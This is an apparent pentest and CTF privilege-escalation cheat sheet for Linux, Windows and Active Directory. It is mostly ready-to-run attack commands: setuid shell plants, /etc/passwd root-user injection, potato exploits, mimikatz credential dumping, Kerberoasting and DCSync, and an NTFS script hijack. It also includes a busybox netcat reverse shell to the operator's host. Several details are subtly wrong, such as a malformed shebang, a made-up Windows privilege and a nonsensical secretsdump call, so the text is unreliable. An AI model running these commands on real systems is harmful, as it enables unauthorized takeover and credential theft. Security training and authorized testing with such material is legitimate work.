# Privilege Escalation

The stage that separates someone who found a foothold from someone who finished
the box. Entirely enumeration-driven: almost every escalation is a
misconfiguration you missed during enumeration.

## Contents

- [The pattern that always works](#the-pattern-that-always-works)
- [Linux escalation](#linux-escalation)
- [Windows escalation](#windows-escalation)
- [Active Directory](#active-directory)
- [Worked example: NTFS ownership](#worked-example-ntfs-ownership)
- [When the tools do not run](#when-the-tools-do-not-run)

---

## The pattern that always works

Same on every platform, every time:

1. **Enumerate.** Collect what the user can see and what the system says about
   them. Do not skip this because you think you already know the answer.
2. **Identify.** Compare the two. What can the user do that the user was never
   meant to do?
3. **Verify.** Prove the misconfiguration really is a misconfiguration, not
   something already locked down.
4. **Exploit minimally.** Get the proof, then stop.
5. **Confirm the new identity.** `whoami`, `id`, `whoami /priv`. Do not assume
   it worked because the command produced output.

The tooling exists to make step one faster. Steps three and four are where
beginners get sloppy, and sloppiness is how you end up chasing a privesc that was
never going to work.

---

## Linux escalation

```bash
# Start here, always. Two minutes, enormous yield.
sudo -l                                      # what can this user actually run?
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
find / -perm -2000 -type f 2>/dev/null      # SGID binaries
find / -perm -o+w -type f 2>/dev/null       # world-writable files
ls -la /etc/cron* /var/spool/cron/           # scheduled jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
```

```bash
# Kernel and release. Half of all Linux privesc questions end at the version.
uname -a
cat /etc/os-release
```

```bash
# Automate, then verify by hand
wget -qO /tmp/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

# Remote, on a box with no internet
wget -q http://<your-ip>:8000/linpeas.sh -O /tmp/l.sh
```

**Automation is a lead generator, not an answer.** Take each suggestion and
confirm it manually before you build anything on it. LinPEAS will happily report
a SUID binary that is patched, and chasing a dead end costs more time than
reading a page yourself.

### SUID and capabilities

```bash
find / -perm -4000 -type f 2>/dev/null | while read -r f; do echo "=== $f ==="; file "$f"; done
```

Binaries worth knowing on sight: `sudo`, `su`, `pkexec`, `passwd`, `mount`,
`umount`, `newgrp`, `chfn`, `gpasswd`, `find`, `vim`, `nano`, `perl`, `python`,
`ruby`, `tar`, `env`, `nmap`, `awk`, `git`, `less`, `more`, `man`, `doas`,
`flock`, `busybox`, `runuser`, `su-exec`, `suexec`.

```bash
# The find-exec trick. Escalate via a SUID find on a writable path.
sudo find / -name x -exec /bin/sh -p \; 2>/dev/null
# Newer kernels restrict this. If it fails, that is expected, move on.

# sudo with a writable script
echo '!/bin/sh
id > /tmp/pwned' > /tmp/privesc
chmod +x /tmp/privesc
sudo /tmp/privesc
cat /tmp/pwned

# sudo allowing a program you control the arguments to
sudo -l | grep -i "bin\|sh\|python\|perl\|vim\|less\|find"
```

```bash
# Capabilities. More useful than SUID on modern systems.
getcap -r / 2>/dev/null
# Notable: cap_dac_read_search reads any file, cap_sys_admin is close to root
# cap_setuid, cap_net_raw, cap_sys_ptrace
```

### PATH hijack

The most reliable class, and it appears constantly.

```bash
# 1. Check the PATH
echo $PATH
# 2. Check whether any directory in it is writable by you
sudo -l
ls -ld /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin
```

```bash
# 3. A sudo rule referencing a bare command name is the vulnerable pattern
sudo apt-get update
# 4. Plant a higher-precedence binary of the same name
echo '#!/bin/sh
id > /tmp/pwned' > /tmp/apt-get
chmod +x /tmp/apt-get
# 5. Ensure /tmp precedes /usr/bin, then trigger
PATH=/tmp:$PATH sudo apt-get update
cat /tmp/pwned
```

```bash
# The same trick for a cron job that calls a bare command
echo '#!/bin/sh
/bin/cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > /tmp/whoami
chmod +x /tmp/whoami
```

```bash
# Relative path abuse, same idea
sudo less /var/log/apache2/access.log
# Inside less: !/bin/sh
```

### Writable scripts and services

```bash
# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
crontab -l
# Look for: a script writable by you, a wildcard, or a PATH you control

# systemd
systemctl list-timers --all
ls -la /etc/systemd/system/
systemctl cat <service>                      # read the unit file
# writable unit file, or a writable ExecStart target, is a path to root
```

```bash
# Python and other interpreters in privileged jobs
# A cron job running: python3 /opt/backup.py
# And /opt/backup.py is writable by you
printf 'import os\nos.system("cp /bin/bash /tmp/bash; chmod u+s /tmp/bash")\n' > /opt/backup.py
```

### Container escapes

```bash
cat /proc/1/cgroup                      # are we in a container
ls -la /.dockerenv 2>/dev/null
cat /proc/self/status | grep CapEff    # capabilities
mount | grep -i "docker\|overlay"
```

```bash
# A writable host mount is root on the host
mount | grep -w "rw"
# A Docker socket mounted into the container is root on the host
ls -la /var/run/docker.sock
```

```bash
# Escape when the Docker API is exposed
docker -H tcp://<target>:2375 ps
curl -s http://<target>:2375/containers/json | jq .
```

### Other reliable Linux vectors

```bash
# Writable /etc/passwd or /etc/shadow
ls -la /etc/passwd /etc/shadow
echo 'hacker:$6$...:0:0:root:/root:/bin/bash' >> /etc/passwd     # only if writable

# NFS, often root-squashed but not always
showmount -e <target>
mount -o nolock,ver=3 <target>:/ /mnt/nfs -v
cat /mnt/nfs/etc/passwd
# If root_squash is off, you have root on the export

# Kernel and version-specific exploits
# Look for the version, then check what applies to that exact version
searchsploit linux <kernel-version>
searchsploit <service> <version>
# In a lab, out-of-band servers usually run a small local web server.
# It may have a file-upload endpoint that drops into /root and is served
# from the machine's real root directory. Always check before assuming RCE.
```

```bash
# Secrets and keys, frequently missed
find / -name "*.pem" -o -name "id_rsa" -o -name "*.key" 2>/dev/null
find / -name "*.kdbx" -o -name "credentials" -o -name "*password*" 2>/dev/null
cat ~/.bash_history
ls -la ~/
cat /home/*/.bash_history
env
```

---

## Windows escalation

```bash
# Start here
whoami
whoami /priv                                  # privileges on the current token
whoami /groups
net user %USERNAME%
net localgroup Administrators
systeminfo
```

The thing to understand is that on Windows, privileges are attached to the
**token**, not to the account. A user with `SeImpersonatePrivilege` can become
any account, including SYSTEM, without knowing a password. That is the single
most common Windows privesc in a lab, and the `potato` family exploits it.

```bash
# The definitive check
whoami /priv
```

| Privilege | Why it matters |
|---|---|
| `SeImpersonatePrivilege` | Impersonate any token. The potato family. |
| `SeAssignPrimaryTokenPrivilege` | Same, second route to the family |
| `SeDebugPrivilege` | Debug any process, read its memory, steal its token |
| `SeTcbPrivilege` | Act as part of the operating system |
| `SeImpersonateNamedPipeClient` | Variant used by the named pipe attacks |
| `SeBackupPrivilege` | Read any file, including `SAM` and `NTDS.dit` |
| `SeRestorePrivilege` | Write any file, including to `System32` |
| `SeLoadDriverPrivilege` | Load a kernel driver |
| `SeTakeOwnershipPrivilege` | Take ownership of any object. The Anthem room. |

### The potato family

All of them work the same way: use a privileged service to create a token for
`NT AUTHORITY\SYSTEM`, then spawn a process with it. No password required.

```bash
# The check
whoami /priv | findstr /i "Impersonate AssignPrimary"
```

```bash
# PrintSpoofer, needs an interactive-ish context
PrintSpoofer64.exe
.\PrintSpoofer64.exe -i
.\PrintSpoofer64.exe -s "NT AUTHORITY\SYSTEM"

# GodPotato, works from a service
.\GodPotato.exe -cmd "whoami > C:\Users\Public\out.txt"
type C:\Users\Public\out.txt

# RoguePotato, if WMI is reachable
.\RoguePotato.exe -l \\.\pipe\test
.\RoguePotato.exe -c "whoami" -p C:\ProgramData\potato.exe

# SweetPotato, the most broadly compatible
.\SweetPotato.exe
```

These are exploitation tools. `whoami /priv` is the check, and the check is
where the finding comes from. Use them within an engagement where the client has
signed off on privesc, which is essentially all of them.

### Token and process manipulation

```bash
# SeDebugPrivilege: steal SYSTEM from a running process
.\psinject.exe -pid <pid> -i -t
.\mimikatz.exe privilege::debug
.\mimikatz.exe sekurlsa::logonpasswords          # credentials from memory

# More reliable, built in, and it is a feature, not an exploit
# mimikatz is heavy and gets flagged. These do the same job.
sekurlsa::pth   # pass the hash

# SharpHound for the AD path
.\SharpHound.exe --collection:All --domain <domain> <domain>
```

### Service and path misconfiguration

```bash
# Enumerate services
wmic service list brief
wmic service get name,pathname,startmode,startname
sc qc <servicename>                    # the binary path, read this
```

```bash
# Unquoted service path. A path containing a space and no quotes is exploitable.
# C:\Program Files\My App\service.exe
# C:\Progra~1\My App\service.exe
# If any intermediate directory is writable, you get SYSTEM.
icacls "C:\Program Files"
accesschk -w "C:\Program Files\My App" -uw
```

```bash
# Weak service permissions. The service binary or its directory is writable.
icacls "C:\Program Files\My App\service.exe"
icacls "C:\Program Files\My App"
accesschk -uwcv "My App" -s
```

```bash
# A writable binary that a service runs
# 1. Confirm the service runs as SYSTEM
sc qc MyService
# 2. Overwrite the binary with a copy of yourself
# 3. Restart the service
Restart-Service MyService
```

### Registry autoruns and AlwaysInstallElevated

```bash
# Enumerate persistence, in case something was planted
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Winlogon, userinit, and shell are all worth reading
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Startup folders
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

```bash
# AlwaysInstallElevated. Present on some lab boxes and on a lot of real misconfigured desktops.
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated

# If both are 1, an MSI you supply runs as SYSTEM
# Generate a malicious MSI with msiexec tooling, then ask the service to install it
# A "custom action" of type 18 runs an arbitrary command as SYSTEM.
msiexec /i malicious.msi /qn
```

```bash
# Unquoted service environment, another common one
reg query "HKLM\SYSTEM\CurrentControlSet\Services\<svc>"
# A Path containing a space in ImagePath and no quotes is the same bug as before
```

### Credential material

```bash
# Enumerate stored credentials. This is a list of where to look, not a tool.
cmdkey /list                              # Windows Credential Manager
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials
reg query "HKLM\SECURITY\Cache"           # needs SeBackupPrivilege

# PowerShell history, frequently contains real passwords
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Registry, where installers leave things
reg query HKLM /f "password" /k /s
reg query HKLM /f "password" /v /s
reg query HKLM /f "passwords" /v /s

# Unattend and provisioning, where setup passwords live
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\unattend\Unattend.xml
```

```bash
# LSASS, for SeDebugPrivilege
tasklist /fi "imagename eq lsass.exe"
```

```bash
# Automation, then verify
.\winPEASx64.exe
.\SharpUp.exe
.\PowerUp.ps1
```

Same rule as LinPEAS. It generates leads. Confirm each one manually.

```bash
# PowerShell one-liners that are worth knowing cold
# Current user and their groups
whoami /all
# Local users
Get-LocalUser
Get-LocalGroupMember Administrators
# Firewall rules, which occasionally reveal internal services
Get-NetFirewallRule -Enabled True -Direction Inbound
# Recent PowerShell execution
Get-History
Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue -Include *.ps1 | Select-Object FullName
# Network configuration
Get-NetIPConfiguration
```

### UAC bypass

On a real assessment, UAC bypass is usually noise. Administrative accounts
commonly have UAC enabled, a pentest account should not, and the finding is
frequently just "use the provided admin account".

```bash
# Check your own token integrity first
whoami /groups | findstr "Mandatory Label"
# High integrity means UAC is already off for you
```

If it is genuinely in scope, the technique list is long and version-specific:
fodhelper.exe and computerdefaults.exe abuse, the `sdclt` and `cmstp` paths,
eventvwr, and DLL search-order hijacking into an auto-elevating binary. Verify
the target's build before trying any of them, because the reliable paths change
between builds.

```bash
# Confirm whether you are already elevated before trying anything clever
net session                                  # succeeds only when elevated
```

---

## Active Directory

A discipline of its own. The short version of the paths, in the order worth
attacking them.

```bash
# 1. Enumerate
netexec smb <target> -u users.txt -p passwords.txt --no-bruteforce
netexec smb <target> -u '' -p '' --shares
bloodhound-python -d <domain> -u user -p pass -o out
ldapsearch -x -H ldap://<dc> -b "DC=<domain>,DC=<tld>" "(objectClass=*)"
```

```bash
# 2. Kerberos: find accounts with weak or no pre-authentication
netexec ldap <dc> -u users.txt -p passwords.txt --no-bruteforce --kerberos-endpoints
# AS-REP roasting: crackable without any credentials at all

# Kerberoasting: crack service ticket hashes
netexec ldap <dc> -u user -p pass --kerberoasting output.txt
hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt
```

```bash
# 3. BloodHound, which shows the paths a human cannot see
# Look for: shortest path to Domain Admins, sessions on machines, ACL abuse
.\SharpHound.exe --collection:All --domain <domain> <domain>
# Then load the JSON into BloodHound and read the graph.
```

```bash
# 4. ACL abuse. The high-value ones, by name
GenericAll            full control over the object
GenericWrite         modify attributes, sometimes enough
WriteDacl            change permissions, then grant yourself GenericAll
Owns                 take ownership of the object
WriteSPN             add a service principal name, then kerberoast it
```

```bash
# 5. The credential material
# DCSync: read the whole domain, needs ReplicationGetChanges and ReplicationGetChangesAll
secretsdump.py -domain <domain> -hashes 'krbtgt' <dc>
# Any account with those rights is as good as Domain Admin.
```

```bash
# 6. Delegation abuse, where a relay is the whole attack
# msDS-AllowedToDelegateTo, and user accounts trusted for unconstrained delegation
# Do not set these up on a client system without written permission, and check
# the RoE. It is a change to their infrastructure, not a test request.
```

Always report the path, not just the endpoint. "This account can DCSync the
domain because of this ACL" is the finding. The tool that found it is
incidental.

---

## Worked example: NTFS ownership

The mechanism behind the Anthem room, and a good example of escalation being
purely a configuration problem.

Windows lets you take ownership of any file or folder, and taking ownership
changes the ACL. If a low-privilege user can take ownership of something a
privileged service reads, that is the escalation path.

```bash
# 1. Find the file. In a lab, it is a scheduled task or a service script.
#    In the real world, it is often a scheduled task, a logon script, or a
#    deployment agent.
schtasks /query /fo LIST /v
# Look for a task running as SYSTEM, Administrator, or a service account

# 2. Check whether you can take ownership
icacls "C:\path\to\script.ps1"

# 3. Take ownership
takeown /f "C:\path\to\script.ps1"

# 4. Confirm you now have full control
icacls "C:\path\to\script.ps1"

# 5. Now the key question, and the one people forget.
#    Taking ownership is not the same as being able to WRITE.
#    The inherited ACL still has to grant you write access.
icacls "C:\path\to\script.ps1" | findstr /i "I"
# If you see (I) next to your user, you can write. If you do not, grant it:
icacls "C:\path\to\script.ps1" /grant <user>:(F)     # or (M) for modify

# 6. Append your payload
Add-Content -Path "C:\path\to\script.ps1" -Value "whoami | Out-File C:\Users\Public\proof.txt"

# 7. Trigger it. Either wait for the schedule, or force it.
#    For a scheduled task:
schtasks /run /tn "<TaskName>"
# For a service: Restart-Service <name>

# 8. Confirm the new identity
type C:\Users\Public\proof.txt
```

The lesson generalises beyond the room. On every privesc, ask two questions:
what can I do that the account was not meant to do, and does the system let me?
Most escalations are the answer being yes to both.

---

## When the tools do not run

LinPEAS and WinPEAS need a shell. Sometimes you do not have one, which means
the escalation is the path to getting one.

```bash
# No shell but you can run a command. PowerShell one-liners often work where
# cmd is blocked.
powershell.exe -c "Get-LocalUser"
powershell.exe -enc <base64-encoded-command>       # when quoting is a problem

# No PowerShell. Use native Windows binaries.
net user
net localgroup Administrators
icacls C:\Users
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
schtasks /query /fo csv /v | findstr /i "run as"
```

```bash
# On Linux, no bash but there is python
python3 -c "import os; print(os.getuid(), os.getgid())"
python3 -c "import pwd; print([u.name for u in pwd.getpwall()])"

# Busybox, in minimal containers
busybox wget http://<your-ip>:8000/linpeas.sh -O /tmp/l.sh
busybox nc <your-ip> 4444 -e /bin/sh
```

```bash
# No outbound network. Serve the tooling from your own machine.
python3 -m http.server 8000
# On the target:
wget http://<your-ip>:8000/linpeas.sh -O /tmp/l.sh
curl http://<your-ip>:8000/winPEASx64.exe -o winPEAS.exe
```

Out-of-band servers deserve their own line. In a lab, they are often running a
small web server on the machine with a file-upload endpoint that saves into the
real filesystem root and serves the directory. If you have command execution,
check for it before you build a complicated exfiltration chain:

```bash
# From the target, look for local listeners and common OOB ports
ss -tlnp
netstat -an | findstr LISTEN
curl -s http://127.0.0.1:8000/ | head
```

That is a lab convenience, not a technique. Never assume it exists on a real
client engagement, and never spend engagement time hunting for it.
